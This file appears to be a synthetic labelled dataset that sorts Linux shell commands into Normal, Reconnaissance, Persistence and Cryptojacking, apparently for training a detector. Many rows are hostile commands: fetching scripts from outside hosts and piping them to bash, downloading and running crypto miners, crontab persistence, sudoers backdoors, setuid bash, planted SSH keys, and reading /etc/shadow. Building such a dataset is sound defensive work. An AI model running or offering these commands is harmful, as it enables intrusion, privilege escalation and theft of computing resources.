command,label
ps aux | grep root,Reconnaissance
clear,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
ps aux | grep root,Reconnaissance
cat /etc/shadow,Reconnaissance
chmod u+s /bin/bash,Persistence
uname -a && id && w,Reconnaissance
cat /etc/shadow,Reconnaissance
curl -s http://192.168.1.50/install.sh | bash,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
history,Normal
sudo apt-get update && sudo apt-get upgrade,Normal
cd /home/user && pwd,Normal
cat /proc/cpuinfo; pkill -f cpuminer; wget https://bitbucket.org/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./cpuminer -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
crontab -e,Persistence
htop,Normal
cat /proc/cpuinfo; pkill -f cpuminer; wget https://bitbucket.org/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./cpuminer -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
history,Normal
cd /home/user && pwd,Normal
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
wget http://10.0.0.5/coinminer -O /tmp/coinminer && chmod +x /tmp/coinminer && /tmp/coinminer -o minexmr.com:443,Cryptojacking
ip a && route -n,Reconnaissance
netstat -tulpn,Reconnaissance
chmod u+s /bin/bash,Persistence
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
git clone https://142.250.190.46/repo.git && cd repo && make,Cryptojacking
cat /proc/cpuinfo; pkill -f coinminer; wget https://github.com/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./coinminer -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
cat /proc/cpuinfo; pkill -f cpuminer; wget https://10.0.0.5/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./cpuminer -o minexmr.com:443' >> /etc/crontab,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
ps aux | grep root,Reconnaissance
cat /etc/shadow,Reconnaissance
sudo apt-get update && sudo apt-get upgrade,Normal
echo 'checking system logs',Normal
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
ip a && route -n,Reconnaissance
cat /proc/cpuinfo; pkill -f coinminer; wget https://192.168.1.50/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./coinminer -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
curl -s http://github.com/install.sh | bash,Cryptojacking
uname -a && id && w,Reconnaissance
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
wget http://192.168.1.50/kdevtmpfsi -O /tmp/kdevtmpfsi && chmod +x /tmp/kdevtmpfsi && /tmp/kdevtmpfsi -o xmrpool.eu:9000,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
ping -c 4 10.0.0.5,Normal
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
whoami,Normal
netstat -tulpn,Reconnaissance
htop,Normal
curl -s http://142.250.190.46/install.sh | bash,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
sudo apt-get update && sudo apt-get upgrade,Normal
git clone https://45.33.32.156/repo.git && cd repo && make,Cryptojacking
chmod u+s /bin/bash,Persistence
curl -s http://45.33.32.156/miner.tar.gz | bash,Cryptojacking
chmod u+s /bin/bash,Persistence
nohup ./xmr-stak -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
uname -a && id && w,Reconnaissance
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
curl -s http://45.33.32.156/syslogd | bash,Cryptojacking
echo '* * * * * root /tmp/cron.sh' >> /etc/crontab,Persistence
wget http://github.com/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o monerohash.com:3333,Cryptojacking
git clone https://bitbucket.org/repo.git && cd repo && make,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
htop,Normal
top -n 1,Normal
cat /proc/cpuinfo; pkill -f xmr-stak; wget https://192.168.1.50/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./xmr-stak -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
echo 'checking system logs',Normal
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
htop,Normal
whoami,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
cat /etc/passwd,Reconnaissance
nohup ./coinminer -o minexmr.com:443 -u FAKE_WALLET -p x &,Cryptojacking
htop,Normal
uname -a && id && w,Reconnaissance
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
nohup ./kdevtmpfsi -o nanopool.org:14433 -u FAKE_WALLET -p x &,Cryptojacking
cat /proc/cpuinfo; pkill -f xmrig; wget https://142.250.190.46/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./xmrig -o minexmr.com:443' >> /etc/crontab,Cryptojacking
ps aux | grep root,Reconnaissance
uname -a && id && w,Reconnaissance
nohup ./minerd -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
wget http://github.com/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o xmrpool.eu:9000,Cryptojacking
uname -a && id && w,Reconnaissance
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
ping -c 4 185.12.33.1,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
echo 'checking system logs',Normal
ping -c 4 bitbucket.org,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
echo 'checking system logs',Normal
ping -c 4 185.12.33.1,Normal
cat /etc/shadow,Reconnaissance
cd /home/user && pwd,Normal
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
cat /var/log/syslog | grep error,Normal
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
htop,Normal
git clone https://bitbucket.org/repo.git && cd repo && make,Cryptojacking
chmod u+s /bin/bash,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
nohup ./coinminer -o nanopool.org:14433 -u FAKE_WALLET -p x &,Cryptojacking
ps aux | grep root,Reconnaissance
cat /proc/cpuinfo; pkill -f minerd; wget https://45.33.32.156/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./minerd -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
git clone https://45.33.32.156/repo.git && cd repo && make,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
curl -s http://45.33.32.156/install.sh | bash,Cryptojacking
clear,Normal
cat /proc/cpuinfo; pkill -f minerd; wget https://github.com/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./minerd -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
chmod u+s /bin/bash,Persistence
chmod u+s /bin/bash,Persistence
clear,Normal
uname -a && id && w,Reconnaissance
wget http://bitbucket.org/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o minexmr.com:443,Cryptojacking
cat /etc/shadow,Reconnaissance
ls -la /var/log,Normal
ps aux | grep root,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
crontab -e,Persistence
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
chmod u+s /bin/bash,Persistence
git clone https://192.168.1.50/repo.git && cd repo && make,Cryptojacking
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
nohup ./kdevtmpfsi -o minexmr.com:443 -u FAKE_WALLET -p x &,Cryptojacking
history,Normal
cat /var/log/syslog | grep error,Normal
sudo apt-get update && sudo apt-get upgrade,Normal
top -n 1,Normal
netstat -tulpn,Reconnaissance
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
crontab -e,Persistence
cat /etc/shadow,Reconnaissance
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
git clone https://142.250.190.46/repo.git && cd repo && make,Cryptojacking
ip a && route -n,Reconnaissance
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
echo '* * * * * root /tmp/cron.sh' >> /etc/crontab,Persistence
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
cat /etc/passwd,Reconnaissance
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
top -n 1,Normal
cat /etc/passwd,Reconnaissance
ping -c 4 45.33.32.156,Normal
cat /etc/shadow,Reconnaissance
uname -a && id && w,Reconnaissance
cat /etc/passwd,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
curl -s http://192.168.1.50/cron.sh | bash,Cryptojacking
sudo apt-get update && sudo apt-get upgrade,Normal
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
wget http://10.0.0.5/minerd -O /tmp/minerd && chmod +x /tmp/minerd && /tmp/minerd -o monerohash.com:3333,Cryptojacking
cat /etc/passwd,Reconnaissance
ping -c 4 github.com,Normal
cat /etc/passwd,Reconnaissance
echo 'checking system logs',Normal
cat /etc/shadow,Reconnaissance
nohup ./minerd -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
clear,Normal
clear,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
uname -a && id && w,Reconnaissance
cat /proc/cpuinfo; pkill -f minerd; wget https://45.33.32.156/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./minerd -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
netstat -tulpn,Reconnaissance
cat /var/log/syslog | grep error,Normal
ps aux | grep root,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
crontab -e,Persistence
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
ping -c 4 192.168.1.50,Normal
crontab -e,Persistence
uname -a && id && w,Reconnaissance
uname -a && id && w,Reconnaissance
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
nohup ./xmr-stak -o minexmr.com:443 -u FAKE_WALLET -p x &,Cryptojacking
ls -la /var/log,Normal
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
ping -c 4 45.33.32.156,Normal
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
crontab -e,Persistence
top -n 1,Normal
nohup ./minerd -o minexmr.com:443 -u FAKE_WALLET -p x &,Cryptojacking
cat /etc/shadow,Reconnaissance
netstat -tulpn,Reconnaissance
uname -a && id && w,Reconnaissance
history,Normal
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
whoami,Normal
cat /proc/cpuinfo; pkill -f xmrig; wget https://bitbucket.org/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./xmrig -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
chmod u+s /bin/bash,Persistence
top -n 1,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
crontab -e,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
echo 'checking system logs',Normal
cat /proc/cpuinfo; pkill -f xmrig; wget https://10.0.0.5/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./xmrig -o minexmr.com:443' >> /etc/crontab,Cryptojacking
cat /proc/cpuinfo; pkill -f xmrig; wget https://10.0.0.5/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./xmrig -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
git clone https://bitbucket.org/repo.git && cd repo && make,Cryptojacking
ping -c 4 185.12.33.1,Normal
cat /etc/passwd,Reconnaissance
ping -c 4 192.168.1.50,Normal
chmod u+s /bin/bash,Persistence
chmod u+s /bin/bash,Persistence
chmod u+s /bin/bash,Persistence
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
netstat -tulpn,Reconnaissance
cat /etc/passwd,Reconnaissance
cat /etc/passwd,Reconnaissance
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
chmod u+s /bin/bash,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
curl -s http://45.33.32.156/update.sh | bash,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
htop,Normal
sudo apt-get update && sudo apt-get upgrade,Normal
ip a && route -n,Reconnaissance
wget http://bitbucket.org/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o minexmr.com:443,Cryptojacking
nohup ./cpuminer -o nanopool.org:14433 -u FAKE_WALLET -p x &,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
curl -s http://10.0.0.5/syslogd | bash,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
sudo apt-get update && sudo apt-get upgrade,Normal
cat /proc/cpuinfo; pkill -f kdevtmpfsi; wget https://45.33.32.156/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./kdevtmpfsi -o minexmr.com:443' >> /etc/crontab,Cryptojacking
nohup ./xmr-stak -o monerohash.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
clear,Normal
wget http://185.12.33.1/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o pool.supportxmr.com:3333,Cryptojacking
cat /etc/shadow,Reconnaissance
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
chmod u+s /bin/bash,Persistence
wget http://bitbucket.org/minerd -O /tmp/minerd && chmod +x /tmp/minerd && /tmp/minerd -o xmrpool.eu:9000,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
clear,Normal
netstat -tulpn,Reconnaissance
whoami,Normal
chmod u+s /bin/bash,Persistence
curl -s http://185.12.33.1/install.sh | bash,Cryptojacking
sudo apt-get update && sudo apt-get upgrade,Normal
cat /etc/passwd,Reconnaissance
ps aux | grep root,Reconnaissance
ping -c 4 142.250.190.46,Normal
cat /etc/passwd,Reconnaissance
echo 'checking system logs',Normal
ip a && route -n,Reconnaissance
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
wget http://192.168.1.50/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o pool.supportxmr.com:3333,Cryptojacking
cat /etc/passwd,Reconnaissance
cat /proc/cpuinfo; pkill -f coinminer; wget https://185.12.33.1/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./coinminer -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
top -n 1,Normal
uname -a && id && w,Reconnaissance
cat /proc/cpuinfo; pkill -f cpuminer; wget https://192.168.1.50/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./cpuminer -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
crontab -e,Persistence
whoami,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
ps aux | grep root,Reconnaissance
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
history,Normal
crontab -e,Persistence
uname -a && id && w,Reconnaissance
crontab -e,Persistence
top -n 1,Normal
cat /proc/cpuinfo; pkill -f xmrig; wget https://bitbucket.org/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./xmrig -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
curl -s http://github.com/miner.tar.gz | bash,Cryptojacking
wget http://10.0.0.5/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o minexmr.com:443,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
cat /proc/cpuinfo; pkill -f minerd; wget https://192.168.1.50/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./minerd -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
cat /etc/shadow,Reconnaissance
cat /proc/cpuinfo; pkill -f kdevtmpfsi; wget https://142.250.190.46/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./kdevtmpfsi -o minexmr.com:443' >> /etc/crontab,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
history,Normal
top -n 1,Normal
crontab -e,Persistence
chmod u+s /bin/bash,Persistence
ls -la /var/log,Normal
netstat -tulpn,Reconnaissance
ps aux | grep root,Reconnaissance
uname -a && id && w,Reconnaissance
nohup ./xmrig -o minexmr.com:443 -u FAKE_WALLET -p x &,Cryptojacking
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
htop,Normal
nohup ./xmrig -o xmrpool.eu:9000 -u FAKE_WALLET -p x &,Cryptojacking
wget http://142.250.190.46/coinminer -O /tmp/coinminer && chmod +x /tmp/coinminer && /tmp/coinminer -o monerohash.com:3333,Cryptojacking
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
git clone https://bitbucket.org/repo.git && cd repo && make,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
cat /proc/cpuinfo; pkill -f coinminer; wget https://192.168.1.50/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./coinminer -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
nohup ./kdevtmpfsi -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
ls -la /var/log,Normal
ls -la /var/log,Normal
cat /proc/cpuinfo; pkill -f xmrig; wget https://bitbucket.org/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./xmrig -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
crontab -e,Persistence
top -n 1,Normal
wget http://185.12.33.1/cpuminer -O /tmp/cpuminer && chmod +x /tmp/cpuminer && /tmp/cpuminer -o minexmr.com:443,Cryptojacking
curl -s http://10.0.0.5/update.sh | bash,Cryptojacking
cd /home/user && pwd,Normal
top -n 1,Normal
curl -s http://45.33.32.156/install.sh | bash,Cryptojacking
uname -a && id && w,Reconnaissance
curl -s http://142.250.190.46/miner.tar.gz | bash,Cryptojacking
history,Normal
cat /proc/cpuinfo; pkill -f cpuminer; wget https://192.168.1.50/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./cpuminer -o minexmr.com:443' >> /etc/crontab,Cryptojacking
top -n 1,Normal
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
crontab -e,Persistence
curl -s http://10.0.0.5/cron.sh | bash,Cryptojacking
ps aux | grep root,Reconnaissance
curl -s http://185.12.33.1/miner.tar.gz | bash,Cryptojacking
nohup ./xmr-stak -o nanopool.org:14433 -u FAKE_WALLET -p x &,Cryptojacking
chmod u+s /bin/bash,Persistence
crontab -e,Persistence
echo '* * * * * root /tmp/cron.sh' >> /etc/crontab,Persistence
ls -la /var/log,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
crontab -e,Persistence
wget http://185.12.33.1/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o xmrpool.eu:9000,Cryptojacking
top -n 1,Normal
cd /home/user && pwd,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
uname -a && id && w,Reconnaissance
uname -a && id && w,Reconnaissance
chmod u+s /bin/bash,Persistence
ping -c 4 45.33.32.156,Normal
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
ip a && route -n,Reconnaissance
ping -c 4 45.33.32.156,Normal
cd /home/user && pwd,Normal
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
cat /var/log/syslog | grep error,Normal
cd /home/user && pwd,Normal
cat /var/log/syslog | grep error,Normal
ps aux | grep root,Reconnaissance
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
cat /etc/shadow,Reconnaissance
clear,Normal
cd /home/user && pwd,Normal
wget http://bitbucket.org/kdevtmpfsi -O /tmp/kdevtmpfsi && chmod +x /tmp/kdevtmpfsi && /tmp/kdevtmpfsi -o nanopool.org:14433,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
chmod u+s /bin/bash,Persistence
history,Normal
cat /proc/cpuinfo; pkill -f minerd; wget https://bitbucket.org/update.sh -O update.sh && tar -xzf update.sh && echo '@reboot ./minerd -o nanopool.org:14433' >> /etc/crontab,Cryptojacking
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
whoami,Normal
chmod u+s /bin/bash,Persistence
wget http://10.0.0.5/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o nanopool.org:14433,Cryptojacking
curl -s http://bitbucket.org/syslogd | bash,Cryptojacking
cat /proc/cpuinfo; pkill -f xmr-stak; wget https://github.com/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./xmr-stak -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
cat /etc/shadow,Reconnaissance
cat /etc/shadow,Reconnaissance
ip a && route -n,Reconnaissance
cat /etc/shadow,Reconnaissance
curl -s http://142.250.190.46/update.sh | bash,Cryptojacking
history,Normal
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
nohup ./xmr-stak -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
git clone https://192.168.1.50/repo.git && cd repo && make,Cryptojacking
netstat -tulpn,Reconnaissance
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
crontab -e,Persistence
htop,Normal
ping -c 4 192.168.1.50,Normal
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
cat /var/log/syslog | grep error,Normal
nohup ./cpuminer -o minexmr.com:443 -u FAKE_WALLET -p x &,Cryptojacking
ps aux | grep root,Reconnaissance
htop,Normal
echo '* * * * * root /tmp/update.sh' >> /etc/crontab,Persistence
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
uname -a && id && w,Reconnaissance
chmod u+s /bin/bash,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
ls -la /var/log,Normal
history,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
curl -s http://10.0.0.5/cron.sh | bash,Cryptojacking
chmod u+s /bin/bash,Persistence
cat /etc/passwd,Reconnaissance
echo 'checking system logs',Normal
history,Normal
git clone https://142.250.190.46/repo.git && cd repo && make,Cryptojacking
wget http://github.com/xmr-stak -O /tmp/xmr-stak && chmod +x /tmp/xmr-stak && /tmp/xmr-stak -o pool.supportxmr.com:3333,Cryptojacking
htop,Normal
cd /home/user && pwd,Normal
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
uname -a && id && w,Reconnaissance
cat /var/log/syslog | grep error,Normal
crontab -e,Persistence
whoami,Normal
uname -a && id && w,Reconnaissance
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
htop,Normal
cat /proc/cpuinfo; pkill -f minerd; wget https://10.0.0.5/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./minerd -o monerohash.com:3333' >> /etc/crontab,Cryptojacking
chmod u+s /bin/bash,Persistence
chmod u+s /bin/bash,Persistence
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
nohup ./cpuminer -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
sudo apt-get update && sudo apt-get upgrade,Normal
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
git clone https://142.250.190.46/repo.git && cd repo && make,Cryptojacking
chmod u+s /bin/bash,Persistence
git clone https://bitbucket.org/repo.git && cd repo && make,Cryptojacking
ip a && route -n,Reconnaissance
ip a && route -n,Reconnaissance
cat /proc/cpuinfo; pkill -f cpuminer; wget https://185.12.33.1/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./cpuminer -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
nohup ./cpuminer -o nanopool.org:14433 -u FAKE_WALLET -p x &,Cryptojacking
ps aux | grep root,Reconnaissance
echo '* * * * * root /tmp/syslogd' >> /etc/crontab,Persistence
crontab -e,Persistence
echo 'checking system logs',Normal
ip a && route -n,Reconnaissance
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
htop,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
chmod u+s /bin/bash,Persistence
cd /home/user && pwd,Normal
cat /proc/cpuinfo; pkill -f coinminer; wget https://142.250.190.46/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./coinminer -o minexmr.com:443' >> /etc/crontab,Cryptojacking
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
